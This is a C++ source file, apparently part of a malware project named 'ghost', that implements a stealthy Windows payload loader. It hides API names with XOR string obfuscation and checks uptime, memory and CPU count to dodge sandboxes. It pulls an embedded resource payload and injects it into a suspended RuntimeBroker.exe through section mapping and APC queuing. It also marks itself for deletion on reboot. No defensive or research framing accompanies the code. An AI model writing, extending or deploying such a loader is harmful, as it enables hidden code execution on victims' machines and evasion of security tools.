#include "loader.h"
#include "../core/ghost_core.h"
#include "../core/config.h"
#include <winternl.h>
#include <psapi.h>
#include <shlwapi.h>
#include <memory>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef SECTION_INHERIT_DEFINED
#define SECTION_INHERIT_DEFINED

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#endif

namespace ghost {
namespace loader {

template <size_t N>
class ObfuscatedWString {
    wchar_t m_data[N];
    wchar_t m_key;
public:
    constexpr ObfuscatedWString(const wchar_t (&str)[N], wchar_t key) : m_data{0}, m_key(key) {
        for (size_t i = 0; i < N; ++i) {
            m_data[i] = str[i] ^ key;
        }
    }
    std::wstring decrypt() const {
        std::wstring result(N - 1, L'\0');
        for (size_t i = 0; i < N - 1; ++i) {
            result[i] = m_data[i] ^ m_key;
        }
        return result;
    }
};
#define OBF_W(str) ObfuscatedWString<sizeof(str)/sizeof(wchar_t)>(str, L'K').decrypt()

template <size_t N>
class ObfuscatedAString {
    char m_data[N];
    char m_key;
public:
    constexpr ObfuscatedAString(const char (&str)[N], char key) : m_data{0}, m_key(key) {
        for (size_t i = 0; i < N; ++i) {
            m_data[i] = str[i] ^ key;
        }
    }
    std::string decrypt() const {
        std::string result(N - 1, '\0');
        for (size_t i = 0; i < N - 1; ++i) {
            result[i] = m_data[i] ^ m_key;
        }
        return result;
    }
};
#define OBF_A(str) ObfuscatedAString<sizeof(str)/sizeof(char)>(str, 'K').decrypt()

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext,
    PIO_STATUS_BLOCK ApcStatusBlock,
    ULONG ApcReserved
);

static pNtCreateSection    g_pNtCreateSection    = nullptr;
static pNtMapViewOfSection  g_pNtMapViewOfSection  = nullptr;
static pNtQueueApcThread    g_pNtQueueApcThread    = nullptr;


static bool IsBeingWatched() {
    if (GetTickCount64() < 60000) return true;

    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / (1024 * 1024 * 1024) < 4) return true;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 4) return true; 

    return false;
}

static bool ResolveNtFunctions() {
    std::wstring ntdllName = OBF_W(L"ntdll.dll");
    HMODULE hNtdll = GetModuleHandleW(ntdllName.c_str());
    if (!hNtdll) return false;

    std::string ntCreateStr = OBF_A("NtCreateSection");
    std::string ntMapStr = OBF_A("NtMapViewOfSection");
    std::string ntQueueStr = OBF_A("NtQueueApcThread");

    g_pNtCreateSection    = (pNtCreateSection)   GetProcAddress(hNtdll, ntCreateStr.c_str());
    g_pNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, ntMapStr.c_str());
    g_pNtQueueApcThread   = (pNtQueueApcThread)  GetProcAddress(hNtdll, ntQueueStr.c_str());

    return g_pNtCreateSection && g_pNtMapViewOfSection && g_pNtQueueApcThread;
}

bool ReflectiveLoad() {
    if (IsBeingWatched()) return false; 
    if (!ResolveNtFunctions()) return false;

    BYTE* payload = nullptr;
    SIZE_T payloadSize = 0;

    if (!GetEmbeddedPayload(&payload, &payloadSize)) {
        return false;
    }

    HANDLE hSection = nullptr;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = payloadSize;

    NTSTATUS status = g_pNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        nullptr,
        &maxSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        nullptr
    );

    if (!NT_SUCCESS(status)) {
        VirtualFree(payload, 0, MEM_RELEASE);
        return false;
    }

    PVOID baseAddr = nullptr;
    SIZE_T viewSize = 0;
    
    status = g_pNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0,
        0,
        nullptr,
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE 
    );

    if (!NT_SUCCESS(status)) {
        CloseHandle(hSection);
        VirtualFree(payload, 0, MEM_RELEASE);
        return false;
    }

    memcpy(baseAddr, payload, payloadSize);

    DWORD oldProtect;
    VirtualProtect(baseAddr, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    VirtualFree(payload, 0, MEM_RELEASE);
    CloseHandle(hSection);

    return true;
}

bool HollowProcess(const wchar_t* targetProcessPath) {
    if (IsBeingWatched()) return false; 
    if (!ResolveNtFunctions()) return false;

    BYTE* payload = nullptr;
    SIZE_T payloadSize = 0;

    if (!GetEmbeddedPayload(&payload, &payloadSize)) {
        return false;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(nullptr, (LPWSTR)targetProcessPath, nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        VirtualFree(payload, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hSection = nullptr;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = payloadSize;

    NTSTATUS status = g_pNtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);
    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 0);
        VirtualFree(payload, 0, MEM_RELEASE);
        return false;
    }

    PVOID localBase = nullptr;
    SIZE_T viewSize = 0;
    status = g_pNtMapViewOfSection(hSection, GetCurrentProcess(), &localBase, 0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
    
    if (NT_SUCCESS(status)) {
        memcpy(localBase, payload, payloadSize);
        UnmapViewOfFile(localBase); 
    }

    PVOID remoteBase = nullptr;
    viewSize = 0;
    status = g_pNtMapViewOfSection(hSection, pi.hProcess, &remoteBase, 0, 0, nullptr, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

    CloseHandle(hSection);
    VirtualFree(payload, 0, MEM_RELEASE);

    if (!NT_SUCCESS(status)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    status = g_pNtQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)remoteBase, nullptr, nullptr, 0);
    
    if (NT_SUCCESS(status)) {
        ResumeThread(pi.hThread); 
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    } else {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
}

bool SelfDeleteOnReboot() {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    MoveFileExW(selfPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    return true;
}

bool GetEmbeddedPayload(BYTE** outPayload, SIZE_T* outSize) {
    *outPayload = nullptr;
    *outSize = 0;

    HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(101), (LPCWSTR)RT_RCDATA);
    if (!hRes) return false;

    HGLOBAL hLoad = LoadResource(nullptr, hRes);
    if (!hLoad) return false;

    void* data = LockResource(hLoad);
    DWORD size = SizeofResource(nullptr, hRes);
    if (!data || size == 0) return false;

    *outPayload = (BYTE*)VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*outPayload) return false;

    memcpy(*outPayload, data, size);
    *outSize = size;

    return true;
}

bool Activate() {
    return HollowProcess(L"C:\\Windows\\System32\\RuntimeBroker.exe");
}

}
}